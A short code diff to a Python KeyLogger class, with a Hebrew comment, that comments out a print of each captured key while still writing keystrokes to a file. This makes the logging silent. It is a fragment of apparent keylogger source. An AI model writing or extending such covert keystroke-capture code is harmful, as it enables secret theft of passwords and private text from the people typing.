@@ -9,7 +9,7 @@ class KeyLogger:
         # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
         def __on_press(Key):
             key_nise = self.nurmal_key(Key)
-            print(key_nise)
+            # print(key_nise)
             FileWriter().write(key_nise)
 
         def on_release(key):
